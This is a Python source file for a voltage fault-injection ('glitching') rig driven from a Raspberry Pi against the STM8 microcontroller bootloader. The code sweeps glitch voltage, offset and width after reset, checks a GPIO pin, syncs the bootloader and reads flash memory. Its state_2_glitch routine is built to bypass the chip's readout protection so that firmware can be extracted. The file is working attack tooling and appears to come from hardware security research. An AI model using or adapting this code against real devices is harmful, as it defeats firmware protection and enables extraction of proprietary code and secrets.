from glitcher import glitcher
from gpiozero import DigitalOutputDevice, DigitalInputDevice, Button
import numpy as np

from exceptions import *

from stm8_bootl import stm8_bootloader, flash_stm8

import serial

import logging

from time import sleep
import sys

class stm8_glitcher:
    '''Class for glitching the stm8 bootloader'''

    '''GPIO pins to check the result of the glitch'''
    GPIO_PORT_E7 = 27 # bootloader_state = 2 ; entered bootloader
    GPIO_TRIGGER = 22 # for the trigger


    N_GLITCHES = 1
    V_GLITCH_MAX = 1.5
    W_GLITCH_MAX = 2 # 2 clock ticks max width
    O_GLITCH_MAX = 20 # 30 ticks max offset
    V_NORMAL_MAX = 3.3

    def __init__(self, freq):
        ''':param freq: The frequency of the microcontroller (in Hz)'''
        self.glitcher = glitcher()
        self.bootl_if = stm8_bootloader()

        # For checking the result of the glitch
        self.port_e = DigitalInputDevice(self.GPIO_PORT_E7)
        self.trigger = Button(self.GPIO_TRIGGER, pull_up=False)
        self.reset = self.bootl_if.reset
        self.freq = freq 

        self.glitch_offset = 10  # start at 10 cycles
        self.glitch_width = 1.0 # start at 1 clock cycle
        self.glitch_voltage = 1.72
        self.normal_voltage = 3.3 # 1.85 is lowest the STM8 will still run
        #self.normal_voltage = 1.95 # 1.85 is lowest the STM8 will still run

        #self.glitcher.set_voltages(0.0, 1.85, 0)
        self.glitcher.set_voltages(self.glitch_voltage, self.normal_voltage, 0)
        self.glitcher.dac.setTriggerOnFallingEdge(0)

        self.n_glitches = 0
        self.out_file = ''


    def calc_cycles(self, n_cycles):
        '''calculates microseconds from cycles'''
        return n_cycles / self.freq * 1000000

    def glitch(self, n_cycles, width = 1): 
        '''
            Adds a glitch on n_cycles after the trigger
            :param: n_cycles:  amount of cycles to wait after the trigger
            :param: width: width of the glitch (in clockticks)
        '''
        self.glitcher.clear_pulses()
        # calculate the offset in microseconds
        offset_mus = self.calc_cycles(n_cycles)
        # go for width of 1 cycle
        width_mus = self.calc_cycles(width)
        self.glitcher.add_pulse(offset_mus, width_mus)


    def get_bootl_offset(self):
        self.glitcher.dac.setTriggerOnFallingEdge(0) # for bootloader glitch
        self.glitch_voltage = 1.96
        self.undervolt()
        self.state_1_glitch(14, 50, 0.099, 0.115, 1.96, 2.07, w_inc = 0.1, o_inc = 0.01, sleep_time = 0.00005, ret_value = 0) # finer

    def read_uart_bytes(self):
        f = b""
        serial_port = serial.Serial("/dev/ttyS0", 9600, serial.EIGHTBITS, serial.PARITY_NONE, serial.STOPBITS_ONE, timeout=0.1)
        self.reset.on()
        dat = serial_port.read(1)
        while dat:
            f += dat
            dat = serial_port.read(1)
        self.reset.off()
        with open('bootloader.bin', 'wb') as out_f:
            out_f.write(f)


    def undervolt(self):
        self.glitcher.set_voltages(self.glitch_voltage, self.normal_voltage, 0)
    
    def state_1_glitch(self, o_st, o_end, w_st, w_end, v_start, v_end, n_glitches = 2000, o_inc = 0.01, w_inc = 0.01, v_inc = 0.01, sleep_time = 0.0002, ret_value = 1, out_f = None):
        ''' Glitch the first state of the bootloader (with one option byte enabled, and the other disabled)
        '''
        self.glitcher.dac.setTriggerOnFallingEdge(0) # for bootloader glitch
        try:
            logging.info("Getting params with {} glitches".format(n_glitches))
            if out_f:
                with open(out_f, 'w') as f:
                    f.write('{}\n'.format(n_glitches))
            for f_voltage in np.arange(v_start, v_end, v_inc):
                logging.info("Glitching %f" % (f_voltage))
                self.glitcher.set_voltages(f_voltage, self.normal_voltage, 0)
                for offset in np.arange(o_st, o_end, o_inc):
                    for width in np.arange(w_st, w_end, w_inc):
                        self.glitch(offset, width)
                        res =  self.test_glitches(n_glitches, self.port_e, sleep_time, ret_value = ret_value, n_succ_glitches = n_glitches) 
                        logging.info("%d glitches success (%f, %f, %f)" % (res, offset, width, f_voltage))
                        if out_f:
                            with open(out_f, 'a') as f:
                                f.write('{:f},{:f},{:f},{}\n'.format(f_voltage, offset, width, res)) 

        except KeyboardInterrupt as e:
            logging.info("interrupted (%f, %f)" % (offset, width))

    def state_2_glitch(self, state_1_offset = 61, state_2_offset = 12.6, sleep_time = 0.00006):
        ''' Glitches the bootloader readout protection with both option bytes set
        :state_1_offset: Offset of the first glitch (depends on the first byte in flash memory) 
        :state_2_offset: Offset of the second glitch
        :sleep_time: How long to wait to see if usart high
        '''
        self.glitch_voltage = 1.85
        self.undervolt()
        self.glitcher.dac.setTriggerOnFallingEdge(0) # for bootloader glitch
        state_1_width = 0.104
        state_2_width = 0.104
        while 1:
            glitch_v = 1.83
            while glitch_v < 1.85:
                self.glitcher.set_voltages(glitch_v, self.normal_voltage, 0)
                for s_1_offs in np.arange(state_1_offset, state_1_offset + 0.001, 0.001):
                    state_1_offs = s_1_offs
                    # For first byte AC
                    #for state_2_offs in np.arange(12.6, 13, 0.001):
                    # For first byte 82
                    for state_2_offs in np.arange(state_2_offset, state_2_offset + 0.5, 0.001):
                        self.glitch(state_1_offs, state_1_width)
                        self.glitcher.add_pulse(self.calc_cycles(state_2_offs), self.calc_cycles(state_2_width))
                        logging.info("[%f V]: state 2 glitches: (%f, %f) (%f, %f)" % (glitch_v, state_1_offs, state_1_width, state_2_offs, state_2_width))

                        if self.test_glitches(30000, self.port_e, sleep_time) > 0:
                            logging.info("Entered state 2")
                            logging.info("Glitches success (%f, %f) (%f, %f)" % (state_1_offs, state_1_width, state_2_offs, state_2_width))
                glitch_v += 0.01


    def test_glitches(self, n_times, port, sleep_time, ret_value = 1, n_succ_glitches = 1):
        '''Runs glitches for n_times and checks if port is set high'''
        n_glitches = 0
        # turn off micro
        for i in range(n_times):
            self.reset.off()
            self.glitcher.arm()
            self.reset.on()
            sleep(sleep_time) 
            if self.port_e.value == ret_value:
                # When pin goes high - try to synch the bootloader 
                logging.info("Pin high - checking glitch {}".format(i))
                try:
                    logging.info("Synching bootl")
                    self.bootl_if.synchr_bootl()
                    logging.info("bootl synched!")
                    logging.info(self.bootl_if.read_mem(0x8000, 4))
                    n_glitches += 1
                except NoAckError as e:
                    logging.info(e)
                finally:
                    self.bootl_if.exit_bootl()
                if n_glitches > n_succ_glitches:
                    return n_glitches # return early cause of relay!
        return n_glitches


    
def get_glitch_params(glitcher):
    logdir = 'log-athome/'

    flash_stm8('test.emptychip.hex', 'opt_bootl_enabled_rop_disabled.bin')
    for offset in [72.5, 73]:
        glitcher.state_1_glitch(offset - 0.002, offset + 0.002, 0.09, 0.11, 1.7, 1.9, w_inc=0.002, o_inc=0.002, v_inc=0.02, sleep_time = 0.00006, out_f=logdir + 'EMPTYCHIP.log')

    flash_stm8('test.rcf.hex', 'opt_rop_off_bootl_off.bin')
    for offset in [59, 57.5, 70.5]:
        out_f = logdir + "ROP0BOOTL0-82" + str(offset) + ".log"
        glitcher.state_1_glitch(offset - 0.002, offset + 0.002, 0.09, 0.11, 1.7, 1.9, w_inc = 0.002, o_inc = 0.002, v_inc = 0.02, sleep_time = 0.00006, out_f = out_f)
    flash_stm8('test.firstbyteac.hex', 'opt_rop_off_bootl_off.bin')
    for offset in [60.5, 61, 72.5]:
        out_f = logdir + "ROP0BOOTL0-AC" + str(offset) + ".log"
        glitcher.state_1_glitch(offset - 0.002, offset + 0.002, 0.09, 0.11, 1.7, 1.9, w_inc = 0.002, o_inc = 0.002, v_inc = 0.02, sleep_time = 0.00006, out_f = out_f)
    flash_stm8('test.rcf.hex', 'opt_bootl_enabled_rop_disabled.bin')
    for offset in [76]:
        out_f = logdir + "ROP1BOOTL1-82" + str(offset) + ".log"
        glitcher.state_1_glitch(offset - 0.002, offset + 0.002, 0.09, 0.11, 1.7, 1.9, w_inc = 0.002, o_inc = 0.002, v_inc = 0.02, sleep_time = 0.00006, out_f = out_f)
    flash_stm8('test.firstbyteac.hex', 'opt_bootl_enabled_rop_disabled.bin')
    for offset in [78]:
        out_f = logdir + "ROP1BOOTL1-AC" + str(offset) + ".log"
        glitcher.state_1_glitch(offset - 0.002, offset + 0.002, 0.09, 0.11, 1.7, 1.9, w_inc = 0.002, o_inc = 0.002, v_inc = 0.02, sleep_time = 0.00006, out_f = out_f)



if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(filename)s:%(funcName)s: %(message)s")
    glitcher = stm8_glitcher(2000000) # Set to 2MHz

    # For all option byte configurations and first flash address
    get_glitch_params(glitcher)


    flash_stm8('test.firstbyteac.hex', 'opt_bootl_disabled.bin')
    # For first byte 82
    glitcher.state_2_glitch(state_1_offset = 59, state_2_offset = 14.7)

    # For first byte AC
    glitcher.state_2_glitch(state_1_offset = 61, state_2_offset = 12.6)
